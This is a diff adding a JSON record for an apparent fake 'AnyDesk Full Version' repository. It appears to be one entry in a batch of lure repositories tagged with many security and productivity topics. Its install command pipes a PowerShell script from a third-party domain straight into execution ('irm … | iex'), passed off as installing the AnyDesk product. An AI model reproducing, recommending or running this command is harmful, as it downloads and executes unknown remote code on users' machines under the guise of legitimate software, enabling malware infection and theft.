@@ -1,0 +1,25 @@
+{
+  "repo": "AnyDesk-Full-Version",
+  "product": "AnyDesk Full Version",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new17",
+  "format": "license-md-only",
+  "category": "network",
+  "topics": [
+    "anydesk",
+    "anydesk-pc",
+    "cybersecurity",
+    "privacy-tools",
+    "system-protection",
+    "network-security",
+    "endpoint-security",
+    "desktop-app",
+    "windows-app",
+    "professional-tools",
+    "workflow-tools",
+    "productivity-app"
+  ]
+}
